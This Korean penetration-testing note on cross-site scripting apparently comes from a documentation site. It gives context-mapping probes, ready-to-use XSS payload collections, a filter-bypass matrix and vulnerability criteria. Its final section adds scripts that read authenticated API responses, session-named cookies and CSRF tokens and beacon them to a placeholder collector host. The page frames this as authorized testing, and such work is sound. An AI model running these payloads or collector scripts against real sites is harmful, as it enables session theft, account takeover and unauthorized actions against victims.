---
sidebar_position: 19
title: XSS
description: 웹 진단 - Cross-Site Scripting (XSS) 컨텍스트 판단, 페이로드, 우회 노트
keywords: [XSS, Cross-Site Scripting, Reflected, Stored, DOM-based, 입력값 검증, OWASP A05]
draft: false
toc_max_heading_level: 3
---

## 점검 목적

사용자 입력값이 HTML, Attribute, JavaScript, URL, DOM sink에 안전하게 인코딩되지 않은 채 들어가는지 확인. 성공 시 같은 origin 권한으로 **페이지 변조, 피싱, 권한 있는 API 호출, 세션 정보 노출**이 가능함.

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| **Reflected XSS** | 요청 파라미터가 즉시 응답에 반사 | 링크 전달 가능성, 로그인 필요 여부, 클릭 필요 여부 확인 |
| **Stored XSS** | 서버 DB/파일에 저장된 뒤 다른 화면에서 실행 | 관리자/상담원/타 사용자 화면에서 실행되면 우선순위 높음 |
| **DOM-based XSS** | 서버 응답보다 프론트 JS가 `location`, `postMessage`, storage 값을 위험 sink에 넣음 | Raw response와 실제 DOM을 따로 확인 |

---

## 진단 절차

#### Step 1. 진입점 식별

사용자 입력이 들어가거나 화면에 다시 출력될 수 있는 곳을 먼저 잡는다.

- URL 파라미터: `?q=...`, `?search=...`, `?next=...`
- POST/JSON Body: 검색, 댓글, 문의, 게시글, 프로필, 설정값
- HTTP Header: `User-Agent`, `Referer`, 커스텀 헤더
- URL Path: `/user/<name>`, `/category/<keyword>`
- URL Fragment: `#...` DOM-based 후보
- 파일명/메타데이터: 업로드 파일명, SVG, 이미지 미리보기, 첨부 목록

#### Step 2. XSS 진단 루틴

Burp Repeater에서 **고유 마커 + 특수문자 + 최소 실행 후보**를 한 번에 넣고, Raw response / Rendered DOM / Console을 같이 본다. 반영 여부, 인코딩, 필터, 컨텍스트를 분리해서 보지 말고 한 번에 판별한다.

**1. 문자/컨텍스트 맵핑**

```text
xssprobe_9f3'"><>()[]{};:/\`=javascript:confirm(9){{7*7}}${7*7}
```

**2. 태그/이벤트 필터 확인**

```html
xssprobe_9f3'"><svg/onload=confirm(9)><img/src=x onerror=confirm(9)>
```

**3. 컨텍스트 탈출 Polyglot**

```html
xss'"></script></textarea></title></style></xmp><svg/onload=confirm(document.domain)>
```

| 관찰 결과 | 바로 판단 | 다음 행동 |
| :--- | :--- | :--- |
| 마커가 응답에 없음 | 서버 미반영 또는 다른 저장/렌더링 경로 | 목록/상세/관리자 화면, DOM-only 여부 확인 |
| `<`, `>`, `"`, `'`가 entity 처리 | HTML/Attribute XSS 가능성 낮음 | JS string, URL, DOM sink로 전환 |
| `<script>`만 제거 | 태그 블랙리스트 가능성 | `svg`, `img`, `details`, `iframe srcdoc` 확인 |
| 이벤트 핸들러만 제거 | `onload`, `onerror` 중심 필터 가능성 | `onfocus`, `ontoggle`, `onanimationstart`, SVG `onbegin` 확인 |
| 공백/슬래시가 변형 | 단순 정규식 필터 가능성 | `<svg/onload=...>`, `%09`, `%0a`, unquoted attribute 확인 |
| Raw는 안전한데 DOM에서 태그 생성 | 프론트 렌더링 변형 또는 DOM XSS | Elements/Console 기준으로 재판정 |
| CSP violation 발생 | sink는 있으나 실행 차단 | CSP 정책은 `security-headers.md`와 같이 확인 |

#### Step 3. 컨텍스트별 빠른 선택

마커가 반영된 위치를 보고 아래에서 바로 골라 넣는다. XSS는 “센 payload”보다 **컨텍스트에 맞는 탈출 문자**가 먼저다.

| 반영 위치 | 먼저 넣을 payload | 볼 것 |
| :--- | :--- | :--- |
| HTML body: `<div>HERE</div>` | `<svg/onload=confirm(document.domain)>` | 태그가 DOM에 생성되는지 |
| Attribute: `<input value="HERE">` | `" autofocus onfocus=confirm(document.domain) x="` | 속성 탈출 후 이벤트가 붙는지 |
| Attribute: `<input value='HERE'>` | `' autofocus onfocus=confirm(document.domain) x='` | 작은따옴표 탈출 가능 여부 |
| JS string: `var x = "HERE"` | `";confirm(document.domain);//` | 문자열 탈출 후 JS 구문 실행 여부 |
| Script block 내부 | `</script><svg/onload=confirm(document.domain)>` | script 종료 후 HTML 파싱 여부 |
| URL/href | `javascript:confirm(document.domain)` | 실제 clickable/navigable sink인지 |
| JSON 응답 | `<img/src=x onerror=confirm(document.domain)>` | 프론트가 `.html()`, `innerHTML`로 렌더링하는지 |
| DOM source | `#<img/src=x onerror=confirm(document.domain)>` | Raw response가 아니라 실제 DOM 기준으로 확인 |

#### Step 4. Stored / DOM / 영향 확인

- Stored XSS는 저장 요청만 보지 말고 **목록 / 상세 / 관리자 / 알림 / 엑셀/HTML 미리보기**까지 따라간다.
- DOM XSS는 Burp response보다 브라우저 Elements, Sources, Console을 우선한다.
- 영향 입증은 단순 팝업보다 **피해자 권한으로 같은 origin 동작이 가능한지**를 보여주는 게 좋다.
- `document.cookie`는 HttpOnly 여부 확인용으로만 보고, 실제 외부 전송은 사전 협의된 수신 서버에서만 수행한다.

---

## 페이로드 노트

평소에는 `Step 2`와 `Step 3`만으로 대부분 갈린다. 아래는 컨텍스트가 확정됐거나 필터가 보일 때 바로 가져다 쓰는 payload 모음이다.

### 1. HTML body 컨텍스트

입력값이 태그 밖 텍스트 영역에 그대로 출력될 때 사용한다.

```html
<script>confirm(document.domain)</script>
<svg/onload=confirm(document.domain)>
<img/src=x onerror=confirm(document.domain)>
<details open ontoggle=confirm(document.domain)>
<iframe srcdoc="<svg onload=confirm(document.domain)>"></iframe>
```

`<script>`가 막혀도 `svg`, `img`, `details`, `iframe srcdoc` 같은 대체 태그가 살아남는지 본다.

### 2. Attribute 컨텍스트

입력값이 `<input value="HERE">`, `<a title="HERE">` 같은 속성값에 들어갈 때 사용한다.

```html
" onmouseover="confirm(document.domain)
" autofocus onfocus="confirm(document.domain)
" autofocus onfocus=confirm(document.domain) x="
' autofocus onfocus=confirm(document.domain) x='
" onmouseover=confirm(document.domain) x="
```

생성 예시는 아래처럼 속성을 닫고 새 이벤트 핸들러가 붙는 형태다.

```html
<input value="" autofocus onfocus=confirm(document.domain) x="">
```

사용자 interaction이 필요한 `onmouseover`보다 `autofocus onfocus`가 먼저 먹히는지 확인한다.

### 3. JavaScript 문자열 / script block

입력값이 JS 변수, 문자열, template literal, `<script>` 내부에 들어갈 때 사용한다.

```javascript
';confirm(document.domain);//
";confirm(document.domain);//
\';confirm(document.domain);//
\");confirm(document.domain);//
</script><svg/onload=confirm(document.domain)>
${confirm(document.domain)}
`-confirm(document.domain)-`
```

quote가 백슬래시로 escape되는 환경은 `\';...//`처럼 escape 문자를 다시 깨는지 본다.

### 4. URL / href / redirect 컨텍스트

입력값이 `<a href="HERE">`, redirect URL, link-like 필드에 들어갈 때 사용한다.

```html
javascript:confirm(document.domain)
JaVaScRiPt:confirm(document.domain)
java&#x73;cript:confirm(document.domain)
java&#115;cript:confirm(document.domain)
data:text/html,<svg onload=confirm(document.domain)>
```

문자열 저장만으로는 부족하다. 링크 클릭, 리다이렉트, `location.href` 할당처럼 실제 navigation sink인지 확인한다.

### 5. DOM-based XSS

서버 응답에는 payload가 없거나 안전해 보이는데 프론트 JS가 URL/DOM 값을 읽어 위험 sink에 넣는 경우다.

```text
https://<TARGET>/page#<img/src=x onerror=confirm(document.domain)>
https://<TARGET>/page?next=javascript:confirm(document.domain)
https://<TARGET>/page?msg='"><svg/onload=confirm(document.domain)>
```

확인할 source:

```text
location.href
location.search
location.hash
document.referrer
window.name
postMessage data
localStorage / sessionStorage
```

위험 sink:

```text
innerHTML / outerHTML / insertAdjacentHTML
document.write
eval / Function / setTimeout(string)
location / src / href 동적 할당
```

### 6. Stored XSS 확인 흐름

게시글, 댓글, 문의, 파일명, 프로필처럼 저장되는 입력값은 저장 위치와 실행 위치가 다를 수 있다.

```http
POST /api/inquiry/write HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=<USER_SESSION>

category=qna&title=<img/src=x onerror=confirm(document.domain)>&content=test
```

확인은 저장 요청이 아니라 조회 경로까지 이어서 한다.

```http
GET /api/inquiry/list HTTP/1.1
Host: <TARGET>

GET /api/inquiry/detail?id=<ID> HTTP/1.1
Host: <TARGET>
```

작성자 화면에서는 안 터져도 관리자/상담원/목록 페이지에서 실행되면 Stored XSS로 본다.

### 7. SVG / 파일명 / 업로드 기반 XSS

이미지 업로드, 파일 첨부, 파일 목록 출력에서 자주 본다.

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="confirm(document.domain)">
</svg>
```

파일명 기반:

```text
"><img src=x onerror=confirm(document.domain)>.jpg
<svg onload=confirm(document.domain)>.png
```

`<img src="uploaded.svg">`로는 브라우저 정책상 스크립트가 안 도는 경우가 있다. 직접 열기, `object/embed`, 관리자 렌더링, 미리보기 경로를 따로 본다.

### 8. 영향 입증 payload

쿠키 탈취보다 “같은 origin 권한으로 JS 실행”을 보여주는 쪽이 실무 보고에 더 안정적이다.

```html
<svg/onload=confirm(document.domain)>
```

```html
<script>
document.body.insertAdjacentHTML('afterbegin', '<h1>XSS Executed: ' + document.domain + '</h1>');
</script>
```

```html
<script>
fetch('/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(t => document.body.insertAdjacentHTML('beforeend', '<pre>' + t.replace(/[<>&]/g, '_') + '</pre>'));
</script>
```

관리자 화면에서 실행되거나 인증 API가 피해자 권한으로 호출되면 영향도가 올라간다.

---

## 우회 매트릭스

무작정 payload를 늘리지 말고, Burp response에서 **무엇이 제거됐는지** 보고 좁혀간다.

| 필터 증상 | 우회 방향 | 예시 |
| :--- | :--- | :--- |
| `<script>` 제거 | script 대체 태그 | `<svg/onload=...>`, `<img/src=x onerror=...>` |
| 공백 제거 | slash, tab, newline, unquoted attribute | `<svg/onload=...>`, `%09`, `%0a` |
| quote 제거 | unquoted attribute, backtick | `<input autofocus onfocus=...>` |
| 괄호 제거 | tagged template | `` confirm`xss` `` |
| `alert` 차단 | 다른 실행 함수 | `confirm`, `prompt`, `print`, `top['alert'](1)` |
| `onload` / `onerror` 차단 | 다른 이벤트 | `onfocus`, `ontoggle`, `onanimationstart`, SVG `onbegin` |
| `javascript:` 차단 | 인코딩/대소문자 변형 | `JaVaScRiPt:`, `java&#x73;cript:` |
| `<`, `>` entity 처리 | 다른 컨텍스트로 전환 | JS string, URL, DOM sink |
| CSP inline 차단 | CSP 정책 검토 | nonce, allowlist, JSONP, `unsafe-inline` 여부 |

### 우회 payload 예시 모음

```html
<!-- script 대체 -->
<svg/onload=confirm(document.domain)>
<img/src=x onerror=confirm(document.domain)>
<details/open/ontoggle=confirm(document.domain)>

<!-- 이벤트 다양화 -->
<input autofocus onfocus=confirm(document.domain)>
<style>@keyframes x{}</style><xss style=animation-name:x onanimationstart=confirm(document.domain)>
<svg><animate attributeName=x onbegin=confirm(document.domain)></animate></svg>

<!-- 문자/키워드 우회 -->
<svg/onload=confirm`xss`>
<svg/onload=top['confirm'](document.domain)>
<a href=java&#x73;cript:confirm(document.domain)>click</a>
<a href=javascript:confirm(String.fromCharCode(88,83,83))>click</a>

<!-- 실제 진단 통과 사례 -->
<img src = “x” onerror=”\u0061lert(1)”>
<img src="x" onerror="\u0061lert(this['ownerDoc'+'ument']['coo'+'kie'])">
<x-script><!--alert(‘XSS 취약점 존재 !’)//-></x-script>
```

---

## 취약 판정 기준

다음 중 하나라도 해당하면 취약으로 본다.

- [ ] 페이로드가 응답 HTML/JS에 무인코딩으로 포함되어 브라우저에서 JavaScript가 실행됨
- [ ] `document.domain`, `print()`, DOM 변조 등으로 같은 origin에서 스크립트 실행이 확인됨
- [ ] Stored 형태로 저장되어 다른 세션/권한 화면에서도 실행됨
- [ ] JSON/API 응답 자체는 문자열이지만 프론트 렌더링 과정에서 DOM에 태그/이벤트가 생성됨

다음은 취약 아님 또는 저영향으로 분리한다.

- [ ] `<`, `>`, `"`, `'`가 모두 HTML entity로 인코딩되어 실행 컨텍스트를 만들 수 없음
- [ ] CSP로 인라인 실행이 차단되고, 우회 가능한 sink/allowlist가 확인되지 않음
- [ ] Self-XSS로 본인만 트리거 가능하며 외부 전달 경로가 없음

---

## 블라인드 모의해킹 확장

취약점 진단에서는 JavaScript 실행 확인으로 멈추지만, 블라인드 모의해킹에서는 **피해자 권한으로 어디까지 동작 가능한지**를 확인한다.

| 단계 | 확인할 것 | 증거 기준 |
| :--- | :--- | :--- |
| 1. 실행 주체 | 어느 계정/권한 화면에서 실행되는지 | `document.domain`, 현재 path, 사용자 식별 API |
| 2. 세션/토큰 접근 | JS에서 읽히는 쿠키, storage, CSRF token | 승인된 collector 수신 로그 |
| 3. 권한 API 접근 | 피해자 세션으로 내부 API 호출 가능 여부 | `/api/me`, 관리자 API 응답 샘플 |
| 4. 액션 수행 | 피해자 권한으로 상태 변경 요청이 가능한지 | 테스트 데이터 또는 영향 낮은 액션 성공 |

### 권한 API 확인

팝업만으로 끝내지 말고 같은 origin에서 인증 API가 호출되는지 본다. 응답 일부를 collector로 전송해 피해자 권한 API 접근을 입증한다.

```html
<script>
fetch('/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => {
    const sample = t.slice(0, 800);
    navigator.sendBeacon('https://<APPROVED-COLLECTOR>/xss-api',
      JSON.stringify({caseId: 'xss-001', path: location.pathname, sample}));
  });
</script>
```

API 경로는 서비스 구조에 맞춰 `/api/me`, `/api/profile`, `/api/session`, `/api/user/info`처럼 자기 정보 조회 API를 우선한다. 관리자 화면 Stored XSS라면 관리자 전용 API 호출, 권한 화면 접근, 중요 기능 호출 가능성을 단계적으로 확인한다.

### 세션 / 토큰 영향 확인

JS에서 접근 가능한 값은 전체 덤프보다 필요한 키만 최소로 확인한다. HttpOnly가 아닌 쿠키, CSRF token, 화면에 노출된 사용자 식별값처럼 영향 판단에 필요한 값만 승인된 collector로 보낸다.

```html
<script>
const token = document.querySelector('input[name=csrf], meta[name=csrf-token]')?.value
  || document.querySelector('meta[name=csrf-token]')?.content
  || '';
const selectedCookie = document.cookie
  .split('; ')
  .filter(v => /csrf|xsrf|session/i.test(v.split('=')[0]))
  .join('; ');
navigator.sendBeacon('https://<APPROVED-COLLECTOR>/xss-cred',
  JSON.stringify({
    caseId: 'xss-001',
    path: location.pathname,
    readableCookie: selectedCookie,
    csrf: token,
    user: document.querySelector('[data-user-id]')?.getAttribute('data-user-id') || ''
  }));
</script>
```

HttpOnly 쿠키는 JS로 읽히지 않지만, 같은 origin API 호출에는 자동 포함된다. 따라서 쿠키 원문 수집 실패가 영향 없음은 아니다.

### 액션 가능성 확인

권한 있는 API 호출이 가능하면 비파괴 요청부터 본다.

```javascript
fetch('/api/notifications?limit=1', {credentials: 'include'})
  .then(r => r.text())
  .then(t => console.log(t.slice(0, 300)));
```

상태 변경은 테스트 데이터가 있으면 우선 사용하고, 필요하면 영향이 낮고 되돌릴 수 있는 실데이터 액션까지 확인한다.

---

## 참고자료

### 공식 및 테스트 가이드

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [PortSwigger - Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger - XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### 커뮤니티 참고 / 도구

- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
